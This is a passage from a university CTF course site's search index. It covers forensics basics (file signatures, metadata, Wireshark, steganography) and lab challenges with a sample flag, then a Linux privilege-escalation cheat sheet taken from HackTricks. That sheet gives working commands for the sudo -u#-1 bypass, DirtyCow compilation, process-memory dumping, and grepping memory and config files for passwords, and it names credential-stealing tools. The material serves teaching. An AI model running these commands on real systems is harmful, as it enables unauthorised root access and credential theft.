website.</p> <p>These contests run every month by various organizations and universities across the globe. These contests can be arranged in the 3 styles:</p> <ol> <li>Jeopardy </li> <li>Attack &amp; Defense </li> <li>Mixed Style </li> </ol> <p>Most of the CTFs are online, while some of them (usually finals) are offline. The most famous CTF is the DEF CON CTF, which is held every August annually.</p> <p>In our semester, every lab would have several CTF challenges in Jeopardy format. By the end of this semester, yet another AWD (Attack &amp; Defense) CTF would be hold.</p>"},{"location":"CS315/2021/Week%201/#categories","title":"Categories","text":"<p>In Jeopardy format CTFs, there are usually 5 categories:</p> <ul> <li>Forensics</li> </ul> <p>Forensics is the art of recovering the digital trail left on a computer. There are plenty of methods to find data which is seemingly deleted, not stored, or worse, covertly recorded.</p> <ul> <li>Cryptography</li> </ul> <p>Cryptography is the reason we can use banking apps, transmit sensitive information over the web, and in general protect our privacy. However, a large part of CTFs is breaking widely used encryption schemes which are improperly implemented. The math may seem daunting, but more often than not, a simple understanding of the underlying principles will allow you to find flaws and crack the code.</p> <p>The word \u201ccryptography\u201d technically means the art of writing codes. When it comes to digital forensics, it\u2019s a method you can use to understand how data is constructed for your analysis.</p> <ul> <li>Web Exploitation</li> </ul> <p>Websites all around the world are programmed using various programming languages. While there are specific vulnerabilities in each programming langage that the developer should be aware of, there are issues fundamental to the internet that can show up regardless of the chosen language or framework.</p> <p>These vulnerabilities often show up in CTFs as web security challenges where the user needs to exploit a bug to gain some kind of higher level privileges.</p> <ul> <li>Reverse Engineering</li> </ul> <p>Reverse Engineering in a CTF is typically the process of taking a compiled (machine code, bytecode) program and converting it back into a more human readable format.</p> <p>Very often the goal of a reverse engineering challenge is to understand the functionality of a given program such that you can identify deeper issues.</p> <ul> <li>Binary Exploitation</li> </ul> <p>Binaries, or executables, are machine code for a computer to execute. For the most part, the binaries that you will face in CTFs are Linux ELF files or the occasional windows executable. Binary Exploitation is a broad topic within Cyber Security which really comes down to finding a vulnerability in the program and exploiting it to gain control of a shell or modifying the program's functions.</p> <p>Some other categories growing up in recent years, like IoT (Internet of Thing) and AI.</p>"},{"location":"CS315/2021/Week%201/#forensics","title":"Forensics","text":"<p>An important part of Forensics is having the right tools, as well as being familiar with the following topics:</p> <ul> <li>File Formats</li> <li>EXIF data</li> <li>Wireshark &amp; PCAPs</li> <li>Wireshark traffic analysis</li> <li>Steganography</li> <li>(Optional) Disk Imaging</li> </ul>"},{"location":"CS315/2021/Week%201/#file-formats","title":"File Formats","text":"<p>File Extensions are not the sole way to identify the type of a file, files have certain leading bytes called file signatures which allow programs to parse the data in a consistent manner. Files can also contain additional \"hidden\" data called metadata which can be useful in finding out information about the context of a file's data.</p>"},{"location":"CS315/2021/Week%201/#file-signatures","title":"File Signatures","text":"<p>File signatures (also known as File Magic Numbers) are bytes within a file used to identify the format of the file. Generally they\u2019re 2-4 bytes long, found at the beginning of a file.</p>"},{"location":"CS315/2021/Week%201/#what-is-it-used-for","title":"What is it used for?","text":"<p>Files can sometimes come without an extension, or with incorrect ones. We use file signature analysis to identify the format (file type) of the file. Programs need to know the file type in order to open it properly.</p>"},{"location":"CS315/2021/Week%201/#how-do-you-find-the-file-signature","title":"How do you find the file signature?","text":"<p>You need to be able to look at the binary data that constitutes the file you\u2019re examining. To do this, you\u2019ll use a hexadecimal editor. Once you find the file signature, you can check it against file signature repositories such as Gary Kessler\u2019s.</p>"},{"location":"CS315/2021/Week%201/#example","title":"Example","text":"<p>The file above, when opened in a Hex Editor, begins with the bytes <code>FFD8FFE0 00104A46 494600</code> or in ASCII <code>\u02c7\u00ff\u02c7\u2021 JFIF</code> where <code>\\x00</code> and <code>\\x10</code> lack symbols.</p> <p>Searching in Gary Kessler\u2019s database shows that this file signature belongs to a <code>JPEG/JFIF graphics file</code>, exactly what we suspect.</p>"},{"location":"CS315/2021/Week%201/#extensions-vs-signature","title":"Extensions vs Signature","text":"<p>File extension is used to uniquely describe a format of a particular file whereas file signature is the header information that is present in each file.</p> <p>Some operating systems (Windows like) use file extension to bind with applications to open the file, while some other operating systems check file signature in the header to guess the file format (file command in Unix).</p>"},{"location":"CS315/2021/Week%201/#what-about-mime","title":"What about MIME?","text":"<p>A media type (also known as a Multipurpose Internet Mail Extensions or MIME type) is a standard that indicates the nature and format of a document, file, or assortment of bytes. It is defined and standardized in IETF's RFC 6838.</p> <p>This type is identified in HTTP packets and DO NOT stipulate the real file format. For example, a MIME type <code>image/jpg</code> means the transferred data LIKELY to be a JPEG image, but user can post a <code>plain text</code> or <code>anything</code> in real body.</p>"},{"location":"CS315/2021/Week%201/#example_1","title":"Example","text":"<pre><code>            \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n            \u2502                \u2502\n            \u2502   HTTP packe   \u2502\n            \u2502                \u2502\n            \u2502 MIME:image/jpg \u2502\n            \u2502                \u2502\nA \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502  \u250c\u2500\u2500\u2510          \u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba B\n            \u2502  \u2502  \u2502          \u2502\n            \u2502  \u2502  \u2502flag.jpg  \u2502\n            \u2502  \u2514\u2500\u252c\u2518          \u2502\n            \u2502    \u2502           \u2502\n            \u2514\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                 \u2502\n                 \u2502\n                 \u25bc\n            \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n            \u2502GIF89a\\xc8\\x00  \u2502\n            \u2502\\x96\\x00\\xf7\\x00\u2502\n            \u2502...             \u2502\n            \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>The file signature is <code>GIF8</code> while the file extension is <code>.jpg</code>, with the MIME type <code>image/jpg</code> during HTTP transmission.</p> <p>The given file is a GIF image instead of JPEG file.</p>"},{"location":"CS315/2021/Week%201/#metadata","title":"Metadata","text":"<p>Metadata is data about data. Different types of files have different metadata. The metadata on a photo could include dates, camera information, GPS location, comments, etc. For music, it could include the title, author, track number and album.</p>"},{"location":"CS315/2021/Week%201/#what-kind-of-file-metadata-is-useful","title":"What kind of file metadata is useful?","text":"<p>Potentially, any file metadata you can find could be useful.</p>"},{"location":"CS315/2021/Week%201/#how-do-i-find-it","title":"How do I find it?","text":"<p>One of our favorite tools is exiftool, which displays metadata for an input file, including: - File size - Dimensions (width and height) - File type - Programs used to create (e.g. Photoshop) - OS used to create (e.g. Apple)</p> <p>Run command line: <code>exiftool(-k).exe [filename]</code> and you should see something like this:</p> <p></p>"},{"location":"CS315/2021/Week%201/#example_2","title":"Example","text":"<p>Let's take a look at File A's metadata with exiftool:</p> <p>File type</p> <p></p> <p>Image description</p> <p></p> <p>Make and camera info</p> <p></p> <p>GPS Latitude/Longitude</p> <p></p>"},{"location":"CS315/2021/Week%201/#timestamps","title":"Timestamps","text":"<p>Timestamps are data that indicate the time of certain events (MAC): - Modification \u2013 when a file was modified - Access \u2013 when a file or entries were read or accessed - Creation \u2013 when files or entries were created</p>"},{"location":"CS315/2021/Week%201/#types-of-timestamps","title":"Types of timestamps","text":"<ul> <li>Modified</li> <li>Accessed</li> <li>Created</li> <li>Date Changed (MFT)</li> <li>Filename Date Created (MFT)</li> <li>Filename Date Modified (MFT)</li> <li>Filename Date Accessed (MFT)</li> <li>INDX Entry Date Created</li> <li>INDX Entry Date Modified</li> <li>INDX Entry Date Accessed</li> <li>INDX Entry Date Changed</li> </ul>"},{"location":"CS315/2021/Week%201/#why-do-we-care","title":"Why do we care?","text":"<p>Certain events such as creating, moving, copying, opening, editing, etc. might affect the MAC times. If the MAC timestamps can be attained, a timeline of events could be created.</p>"},{"location":"CS315/2021/Week%201/#timeline-patterns","title":"Timeline Patterns","text":"<p>There are plenty more patterns than the ones introduced below, but these are the basics you should start with to get a good understanding of how it works, and to complete this challenge.</p> <p> </p>"},{"location":"CS315/2021/Week%201/#examples","title":"Examples","text":"<p>We know that the BMP files fileA and fileD are the same, but that the JPEG files fileB and fileC are different somehow. So how can we find out what went on with these files?</p> <p></p> <p>By using time stamp information from the file system, we can learn that the BMP fileD was the original file, with fileA being a copy of the original. Afterward, fileB was created by modifying fileB, and fileC was created by modifying fileA in a different way.</p> <p>Follow along as we demonstrate.</p> <p>We\u2019ll start by analyzing images in AccessData FTK Imager, where there\u2019s a Properties window that shows you some information about the file or folder you\u2019ve selected.</p> <p> </p> <p>Here are the extracted MAC times for fileA, fileB, fileC and fileD: Note, AccessData FTK Imager assumes that the file times on the drive are in UTC (Universal Coordinated Time). I subtracted four hours, since the USB was set up in Eastern Standard Time. This isn\u2019t necessary, but it helps me understand the times a bit better.</p> <p></p> <p>Highlight timestamps that are the same, if timestamps are off by a few seconds, they should be counted as the same. This lets you see a clear difference between different timestamps. Then, highlight oldest to newest to help put them in order.</p> <p> </p> <p>Identify timestamp patterns.</p> <p></p>"},{"location":"CS315/2021/Week%201/#wireshark","title":"Wireshark","text":"<p>Wireshark is a network protocol analyzer which is often used in CTF challenges to look at recorded network traffic. Wireshark uses a filetype called PCAP to record traffic. PCAPs are often distributed in CTF challenges to provide recorded traffic history.</p>"},{"location":"CS315/2021/Week%201/#interface","title":"Interface","text":"<p>Upon opening Wireshark, you are greeted with the option to open a PCAP or begin capturing network traffic on your device.</p> <p></p> <p>The network traffic displayed initially shows the packets in order of which they were captured. You can filter packets by protocol, source IP address, destination IP address, length, etc.</p> <p></p> <p>In order to apply filters, simply enter the constraining factor, for example 'http', in the display filter bar.</p> <p></p> <p>Filters can be chained together using '&amp;&amp;' notation. In order to filter by IP, ensure a double equals '==' is used.</p> <p></p> <p>The most pertinent part of a packet is its data payload and protocol information.</p> <p></p>"},{"location":"CS315/2021/Week%201/#decrypting-ssl-traffic","title":"Decrypting SSL Traffic","text":"<p>By default, Wireshark cannot decrypt SSL traffic on your device unless you grant it specific certificates.</p>"},{"location":"CS315/2021/Week%201/#high-level-ssl-handshake-overview","title":"High Level SSL Handshake Overview","text":"<p>In order for a network session to be encrypted properly, the client and server must share a common secret for which they can use to encrypt and decrypt data without someone in the middle being able to guess. The SSL Handshake loosely follows this format:</p> <ol> <li>The client sends a list of availble cipher suites it can use along with a random set of bytes referred to as client_random</li> <li>The server sends back the cipher suite that will be used, such as TLS_DHE_RSA_WITH_AES_128_CBC_SHA, along with a random set of bytes referred to as server_random</li> <li>The client generates a pre-master secret, encrypts it, then sends it to the server.</li> <li>The server and client then generate a common master secret using the selected cipher suite</li> <li>The client and server begin communicating using this common secret</li> </ol>"},{"location":"CS315/2021/Week%201/#decryption-requirements","title":"Decryption Requirements","text":"<p>There are several ways to be able to decrypt traffic.</p> <ul> <li>If you have the client and server random values and the pre-master secret, the master secret can be generated and used to decrypt the traffic</li> <li>If you have the master secret, traffic can be decrypted easily</li> <li>If the cipher-suite uses RSA, you can factor n in the key in order to break the encryption on the encrypted pre-master secret and generate the master secret with the client and server randoms</li> </ul> <p></p>"},{"location":"CS315/2021/Week%201/#steganography","title":"Steganography","text":"<p>Steganography is the practice of hiding data in plain sight. Steganography is often embedded in images or audio.</p> <p>You could send a picture of a cat to a friend and hide text inside. Looking at the image, there\u2019s nothing to make anyone think there\u2019s a message hidden inside it.</p> <p></p> <p>You could also hide a second image inside the first.</p> <p></p>"},{"location":"CS315/2021/Week%201/#steganography-detection","title":"Steganography Detection","text":"<p>So we can hide text and an image, how do we find out if there is hidden data?</p> <p></p> <p>FileA and FileD appear the same, but they\u2019re different. Also, FileD was modified after it was copied, so it\u2019s possible there might be steganography in it.</p> <p>FileB and FileC don\u2019t appear to have been modified after being created. That doesn\u2019t rule out the possibility that there\u2019s steganography in them, but you\u2019re more likely to find it in fileD. This brings up two questions:</p> <ol> <li>Can we determine that there is steganography in fileD?</li> <li>If there is, what was hidden in it?</li> </ol>"},{"location":"CS315/2021/Week%201/#lsb-steganography","title":"LSB Steganography","text":"<p>File are made of bytes. Each byte is composed of eight bits.</p> <p></p> <p>Changing the least-significant bit (LSB) doesn\u2019t change the value very much.</p> <p></p> <p>So we can modify the LSB without changing the file noticeably. By doing so, we can hide a message inside.</p>"},{"location":"CS315/2021/Week%201/#lsb-steganography-in-images","title":"LSB Steganography in Images","text":"<p>LSB Steganography or Least Significant Bit Steganography is a method of Steganography where data is recorded in the lowest bit of a byte.</p> <p>Say an image has a pixel with an RGB value of (255, 255, 255), the bits of those RGB values will look like</p> 1 1 1 1 1 1 1 1 <p>By modifying the lowest, or least significant, bit, we can use the 1 bit space across every RGB value for every pixel to construct a message.</p> 1 1 1 1 1 1 1 0 <p>The reason Steganography is hard to detect by sight is because a 1 bit difference in color is insignificant as seen below.</p> <p></p>"},{"location":"CS315/2021/Week%201/#example_3","title":"Example","text":"<p>Let\u2019s say we have an image, and part of it contains the following binary:</p> <p></p> <p>And let\u2019s say we want to hide the character y inside.</p> <p>First, we need to convert the hidden message to binary.</p> <p></p> <p>Now we take each bit from the hidden message and replace the LSB of the corresponding byte with it.</p> <p></p> <p>And again:</p> <p></p> <p>And again:</p> <p></p> <p>And again:</p> <p></p> <p>And again:</p> <p></p> <p>And again:</p> <p></p> <p>And again:</p> <p></p> <p>And once more:</p> <p></p> <p>Decoding LSB steganography is exactly the same as encoding, but in reverse. For each byte, grab the LSB and add it to your decoded message. Once you\u2019ve gone through each byte, convert all the LSBs you grabbed into text or a file. (You can use your file signature knowledge here!)</p>"},{"location":"CS315/2021/Week%201/#what-other-types-of-steganography-are-there","title":"What other types of steganography are there?","text":"<p>Steganography is hard for the defense side, because there\u2019s practically an infinite number of ways it could be carried out. Here are a few examples: - LSB steganography: different bits, different bit combinations - Encode in every certain number of bytes - Use a password - Hide in different places - Use encryption on top of steganography</p>"},{"location":"CS315/2021/Week%201/#blind-watermark","title":"Blind Watermark","text":"<p>Blind watermark is a kind of technique to embed one picture or string to another image. Just like the regular watermark, but the blind watermark cannot be detected by using human eyes. The transformed image is indistinguishable from the origin one.</p> <p>Furthermore, blind watermark should be able to bypass different types of processing of image. For example, rotating the picture should not broke the blind watermark. Some modern researches are focusing on the strong transform of the image, such like film the image from another screen.</p>"},{"location":"CS315/2021/Week%201/#example_4","title":"Example","text":""},{"location":"CS315/2021/Week%201/#encode","title":"encode:","text":"<p>original image </p> <p>watermark </p> <pre><code>python encode.py --image ori.png --watermark watermark.png --result res.png\n</code></pre> <p>result </p>"},{"location":"CS315/2021/Week%201/#decode","title":"decode:","text":"<pre><code>python decode.py --original ori.png --image res.png --result extract.png\n</code></pre> <p>watermark </p>"},{"location":"CS315/2021/Week%201/#hex-editor","title":"Hex Editor","text":"<p>A hexadecimal (hex) editor (also called a binary file editor or byte editor) is a computer program you can use to manipulate the fundamental binary data that constitutes a computer file. The name \u201chex\u201d comes from \u201chexadecimal,\u201d a standard numerical format for representing binary data. A typical computer file occupies multiple areas on the platter(s) of a disk drive, whose contents are combined to form the file. Hex editors that are designed to parse and edit sector data from the physical segments of floppy or hard disks are sometimes called sector editors or disk editors. A hex editor is used to see or edit the raw, exact contents of a file. Hex editors may used to correct data corrupted by a system or application. A list of editors can be found on the forensics Wiki. You can download one and install it on your system.</p>"},{"location":"CS315/2021/Week%201/#example_5","title":"Example","text":"<p>Open fileA.jpg in a hex editor. (Most Hex editors have either a \u201cFile &gt; Open\u201d option or a simple drag and drop.)</p> <p></p> <p>When you open fileA.jpg in your hex editor, you should see something similar to this:</p> <p></p> <p>Your hex editor should also have a \u201cgo to\u201d or \u201cfind\u201d feature so you can jump to a specific byte.</p>"},{"location":"CS315/2021/Week%201/#exercise","title":"Exercise","text":"<p>Every lab we will have 2 or 3 challenges about the topics this week. But in case the difficulty of the challenge, only the first 2 challenges are required. But if you want to fight CTF so hard, you can try the third one. Solving the third one would give you extra points for this lab and some prizes as well.</p> <p>For finishing the challenges, you may click this site: COMPASS CTF Platform and find the category <code>CS315</code>. Other challenges are for CTF team members, but you also can finish them freely. After uploading the flag on the platform, you also need to upload a writeup to blackboard system to grade.</p> <p>The <code>writeup</code> is a file to describe how you solve the challenges and you need also post flag in it. The writeup would use to grade and in case you forget to submit the writeup, during the argue procedure, we would check the submission in platform.</p>"},{"location":"CS315/2021/Week%201/#example-writeup","title":"Example writeup","text":"<pre><code>(5 pt) Congratulations!\nNow in order to check whether you are a robot, you need to submit this flag to show that you are a real human!\nflag{w31com3_t0_CS315_c0Urs3!!!}\n</code></pre> <p>The flag you submit should be <code>flag{w31com3_t0_CS315_c0Urs3!!!}</code>, and the example writeup probably be:</p> <pre><code>Writeup.md\nI am a human so I copied the flag and submit it.\nHere is the flag:\nflag{w31com3_t0_CS315_c0Urs3!!!}\n</code></pre>"},{"location":"CS315/2021/Week%201/#5-pt-what-is-so-called-stream","title":"(5 pt) What is so called stream?","text":"<p>The network is so bad that I can't even send TCP stream through Internet. Wondering if I can use \"UDP streams\"...</p> <p>capture.pcap</p> <p>Try to find <code>flag</code> in this file, the flag format is: <code>picoCTF{***}</code></p> <p>Hint1: Wireshark may be useful.</p>"},{"location":"CS315/2021/Week%201/#5-pt-https-with-secret-sauce","title":"(5 pt) HTTPS with secret sauce","text":"<p>Solved the network problem yesterday, but I found some guy was sniffing my network traffic. I need to be careful to protect my flag. Decide to use HTTPS to submit my flag to <code>web01.fruitinc.xyz</code>.</p> <p></p> <p>By the way, upload my super\u2606secret\u2606file to network disk.</p> <p>capture.pcapng</p> <p>pre-master secret.txt</p> <p>Try to find <code>flag</code> in this file, the flag format is: <code>flag{y2***}</code></p>"},{"location":"CS315/2021/Week%201/#bonus-5-pt-bytes-through-network","title":"(BONUS 5 pt) Bytes through network","text":"<p>That hacker still got my flag! Fine, I'm going to send my file byte by byte. Besides, combined with my knowledge of programming, encryption, and stenography I'm going to fight the final round. WE ARE IN THE ENDGAME NOW.</p> <p>capture.pcapng</p> <p>Try to find <code>flag</code> in this file, the flag format is: <code>flag{***}</code></p> <p>This challenge is extremely hard. The winner will get a badge for solving this.</p>"},{"location":"CS315/2021/Week%2010/","title":"Week10 PWN: Privilege Escalation","text":"<p>According to @Hacktricks: https://book.hacktricks.xyz/</p>"},{"location":"CS315/2021/Week%2010/#system-information","title":"System Information","text":""},{"location":"CS315/2021/Week%2010/#os-info","title":"OS info","text":"<p>Let's starting gaining some knowledge of the OS running</p> <pre><code>(cat /proc/version || uname -a ) 2&gt;/dev/null\nlsb_release -a 2&gt;/dev/null\n</code></pre>"},{"location":"CS315/2021/Week%2010/#path","title":"Path","text":"<p>If you have write permissions on any folder inside the <code>PATH</code> variable you may be able to hijacking some libraries or binaries:</p> <pre><code>echo $PATH\n</code></pre>"},{"location":"CS315/2021/Week%2010/#env-info","title":"Env info","text":"<p>Interesting information, passwords or API keys in the environment variables?</p> <pre><code>(env || set) 2&gt;/dev/null\n</code></pre>"},{"location":"CS315/2021/Week%2010/#kernel-exploits","title":"Kernel exploits","text":"<p>Check the kernel version and if there is some exploit that can be used to escalate privileges</p> <pre><code>cat /proc/version\nuname -a\nsearchsploit \"Linux Kernel\"\n</code></pre> <p>You can find a good vulnerable kernel list and some already compiled exploits here: https://github.com/lucyoa/kernel-exploits and exploitdb sploits. Other sites where you can find some compiled exploits: https://github.com/bwbwbwbw/linux-exploit-binaries, https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack</p> <p>To extract all the vulnerable kernel versions from that web you can do:</p> <pre><code>curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2&gt;/dev/null | grep \"Kernels: \" | cut -d \":\" -f 2 | cut -d \"&lt;\" -f 1 | tr -d \",\" | tr ' ' '\\n' | grep -v \"^\\d\\.\\d$\" | sort -u -r | tr '\\n' ' '\n</code></pre> <p>Tools that could help searching for kernel exploits are:</p> <p>linux-exploit-suggester.sh linux-exploit-suggester2.pl linuxprivchecker.py (execute IN victim,only checks exploits for kernel 2.x)</p> <p>Always search the kernel version in Google, maybe your kernel version is wrote in some kernel exploit and then you will be sure that this exploit is valid.</p>"},{"location":"CS315/2021/Week%2010/#cve-2016-5195-dirtycow","title":"CVE-2016-5195 (DirtyCow)","text":"<p>Linux Privilege Escalation - Linux Kernel &lt;= 3.19.0-73.8</p> <pre><code># make dirtycow stable\necho 0 &gt; /proc/sys/vm/dirty_writeback_centisecs\ng++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil\nhttps://github.com/dirtycow/dirtycow.github.io/wiki/PoCs\nhttps://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c\n</code></pre>"},{"location":"CS315/2021/Week%2010/#sudo-version","title":"Sudo version","text":"<p>Based on the vulnerable sudo versions that appear in:</p> <pre><code>searchsploit sudo\n</code></pre> <p>You can check if the sudo version is vulnerable using this grep.</p> <pre><code>sudo -V | grep \"Sudo ver\" | grep \"1\\.[01234567]\\.[0-9]\\+\\|1\\.8\\.1[0-9]\\*\\|1\\.8\\.2[01234567]\"\n</code></pre>"},{"location":"CS315/2021/Week%2010/#sudo-v128","title":"sudo &lt;= v1.28","text":"<p>From @sickrov</p> <pre><code>sudo -u#-1 /bin/bash\n</code></pre>"},{"location":"CS315/2021/Week%2010/#dmesg-signature-verification-failed","title":"Dmesg signature verification failed","text":"<p>Check smasher2 box of HTB for an example of how this vuln could be exploited</p> <pre><code>dmesg 2&gt;/dev/null | grep \"signature\"\n</code></pre>"},{"location":"CS315/2021/Week%2010/#more-system-enumeration","title":"More system enumeration","text":"<pre><code>date 2&gt;/dev/null #Date\n(df -h || lsblk) #System stats\nlscpu #CPU info\nlpstat -a 2&gt;/dev/null #Printers info\n</code></pre>"},{"location":"CS315/2021/Week%2010/#enumerate-possible-defenses","title":"Enumerate possible defenses","text":""},{"location":"CS315/2021/Week%2010/#apparmor","title":"AppArmor","text":"<pre><code>if [ `which aa-status 2&gt;/dev/null` ]; then\n    aa-status\n  elif [ `which apparmor_status 2&gt;/dev/null` ]; then\n    apparmor_status\n  elif [ `ls -d /etc/apparmor* 2&gt;/dev/null` ]; then\n    ls -d /etc/apparmor*\n  else\n    echo \"Not found AppArmor\"\nfi\n</code></pre>"},{"location":"CS315/2021/Week%2010/#grsecurity","title":"Grsecurity","text":"<pre><code>((uname -r | grep \"\\-grsec\" &gt;/dev/null 2&gt;&amp;1 || grep \"grsecurity\" /etc/sysctl.conf &gt;/dev/null 2&gt;&amp;1) &amp;&amp; echo \"Yes\" || echo \"Not found grsecurity\")\n</code></pre>"},{"location":"CS315/2021/Week%2010/#pax","title":"PaX","text":"<pre><code>(which paxctl-ng paxctl &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo \"Yes\" || echo \"Not found PaX\")\n</code></pre>"},{"location":"CS315/2021/Week%2010/#execshield","title":"Execshield","text":"<pre><code>(grep \"exec-shield\" /etc/sysctl.conf || echo \"Not found Execshield\")\n</code></pre>"},{"location":"CS315/2021/Week%2010/#selinux","title":"SElinux","text":"<pre><code> (sestatus 2&gt;/dev/null || echo \"Not found sestatus\")\n</code></pre>"},{"location":"CS315/2021/Week%2010/#aslr","title":"ASLR","text":"<pre><code>cat /proc/sys/kernel/randomize_va_space 2&gt;/dev/null\n#If 0, not enabled\n</code></pre>"},{"location":"CS315/2021/Week%2010/#docker-breakout","title":"Docker Breakout","text":"<p>If you are inside a docker container you can try to escape from it:</p> <p>https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout</p>"},{"location":"CS315/2021/Week%2010/#drives","title":"Drives","text":"<p>Check what is mounted and unmounted, where and why. If anything is unmounted you could try to mount it and check for private info</p> <pre><code>ls /dev 2&gt;/dev/null | grep -i \"sd\"\ncat /etc/fstab 2&gt;/dev/null | grep -v \"^#\" | grep -Pv \"\\W*\\#\" 2&gt;/dev/null\n#Check if credentials in fstab\ngrep -E \"(user|username|login|pass|password|pw|credentials)[=:]\" /etc/fstab /etc/mtab 2&gt;/dev/null\n</code></pre>"},{"location":"CS315/2021/Week%2010/#installed-software","title":"Installed Software","text":""},{"location":"CS315/2021/Week%2010/#useful-software","title":"Useful software","text":"<p>Enumerate useful binaries</p> <pre><code>which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2&gt;/dev/null\n</code></pre> <p>Also, check if any compiler is installed. This is useful if you need to use some kernel exploit as it's recommended to compile it in the machine where you are going to use it (or in one similar)</p> <pre><code>(dpkg --list 2&gt;/dev/null | grep \"compiler\" | grep -v \"decompiler\\|lib\" 2&gt;/dev/null || yum list installed 'gcc*' 2&gt;/dev/null | grep gcc 2&gt;/dev/null; which gcc g++ 2&gt;/dev/null || locate -r \"/gcc[0-9\\.-]\\+$\" 2&gt;/dev/null | grep -v \"/doc/\")\n</code></pre>"},{"location":"CS315/2021/Week%2010/#vulnerable-software-installed","title":"Vulnerable Software Installed","text":"<p>Check for the version of the installed packages and services. Maybe there is some old Nagios version (for example) that could be exploited for escalating privileges\u2026 It is recommended to check manually the version of the more suspicious installed software.</p> <pre><code>dpkg -l #Debian\nrpm -qa #Centos\n</code></pre> <p>If you have SSH access to the machine you could also use openVAS to check for outdated and vulnerable software installed inside the machine.</p> <p>Note that these commands will show a lot of information that will mostly be useless, therefore it's recommended some application like OpenVAS or similar that will check if any installed software version is vulnerable to known exploits</p>"},{"location":"CS315/2021/Week%2010/#processes","title":"Processes","text":"<p>Take a look to what processes are being executed and check if any process has more privileges that it should (maybe a tomcat being executed by root?)</p> <pre><code>ps aux\nps -ef\ntop -n 1\n</code></pre> <p>Always check for possible electron/cef/chromium debuggers running, you could abuse it to escalate privileges. Linpeas detect those by checking the <code>--inspect</code> parameter inside the command line of the process. Also check your privileges over the processes binaries, maybe you can overwrite someone.</p>"},{"location":"CS315/2021/Week%2010/#process-monitoring","title":"Process monitoring","text":"<p>You can use tools like pspy to monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met.</p>"},{"location":"CS315/2021/Week%2010/#process-memory","title":"Process memory","text":"<p>Some services of a server save credentials in clear text inside the memory. Normally you will need root privileges to read the memory of processes that belong to other users, therefore this is usually more useful when you are already root and want to discover more credentials. However, remember that as a regular user you can read the memory of the processes you own.</p>"},{"location":"CS315/2021/Week%2010/#gdb","title":"GDB","text":"<p>If you have access to the memory of a FTP service (for example) you could get the Heap and search inside of it the credentials.</p> <pre><code>gdb -p &lt;FTP_PROCESS_PID&gt;\n(gdb) info proc mappings\n(gdb) q\n(gdb) dump memory /tmp/mem_ftp &lt;START_HEAD&gt; &lt;END_HEAD&gt;\n(gdb) q\nstrings /tmp/mem_ftp #User and password\n</code></pre>"},{"location":"CS315/2021/Week%2010/#gdb-script","title":"GDB Script","text":"<pre><code>#!/bin/bash\n#./dump-memory.sh &lt;PID&gt;\ngrep rw-p /proc/$1/maps \\\n    | sed -n 's/^\\([0-9a-f]*\\)-\\([0-9a-f]*\\) .*$/\\1 \\2/p' \\\n    | while read start stop; do \\\n    gdb --batch --pid $1 -ex \\\n    \"dump memory $1-$start-$stop.dump 0x$start 0x$stop\"; \\\ndone\n</code></pre>"},{"location":"CS315/2021/Week%2010/#procpidmaps-procpidmem","title":"/proc/$pid/maps &amp; /proc/$pid/mem","text":"<p>For a given process ID, maps shows how memory is mapped within that processes' virtual address space; it also shows the permissions of each mapped region. The mem pseudo file exposes the processes memory itself. From the maps file we know which memory regions are readable and their offsets. We use this information to seek into the mem file and dump all readable regions to a file.</p> <pre><code>procdump()\n(\n    cat /proc/$1/maps | grep -Fv \".so\" | grep \" 0 \" | awk '{print $1}' | ( IFS=\"-\"\n    while read a b; do\n        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \\\n           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of=\"$1_mem_$a.bin\"\n    done )\n    cat $1*.bin &gt; $1.dump\n    rm $1*.bin\n)\n</code></pre>"},{"location":"CS315/2021/Week%2010/#devmem","title":"/dev/mem","text":"<p><code>/dev/mem</code> provides access to the system's physical memory, not the virtual memory. The kernels virtual address space can be accessed using /dev/kmem. Typically, <code>/dev/mem</code> is only readable by root and kmem group.</p> <pre><code>strings /dev/mem -n10 | grep -i PASS\n</code></pre>"},{"location":"CS315/2021/Week%2010/#tools","title":"Tools","text":"<p>To dump a process memory you could use:</p> <ul> <li>https://github.com/hajzer/bash-memory-dump (root) - You can manually remove root requirements and dump process owned by you</li> <li>Script A.5 from https://www.delaat.net/rp/2016-2017/p97/report.pdf (root is required)</li> </ul>"},{"location":"CS315/2021/Week%2010/#credentials-from-process-memory","title":"Credentials from Process Memory","text":""},{"location":"CS315/2021/Week%2010/#manual-example","title":"Manual example","text":"<p>If you find that the authenticator process is running:</p> <pre><code>ps -ef | grep \"authenticator\"\nroot      2027  2025  0 11:46 ?        00:00:00 authenticator\n</code></pre> <p>You can dump the process (see before sections to find different ways to dump the memory of a process) and search for credentials inside the memory:</p> <pre><code>./dump-memory.sh 2027\nstrings *.dump | grep -i password\n</code></pre>"},{"location":"CS315/2021/Week%2010/#mimipenguin","title":"mimipenguin","text":"<p>The tool https://github.com/huntergregal/mimipenguin will steal clear text credentials from memory and from some well known files. It requires root privileges to work properly.</p> Feature Process Name GDM password (Kali Desktop, Debian Desktop) gdm-password Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) gnome-keyring-daemon LightDM (Ubuntu Desktop) lightdm VSFTPd (Active FTP Connections) vsftpd Apache2 (Active HTTP Basic Auth Sessions) apache2 OpenSSH (Active SSH Sessions - Sudo 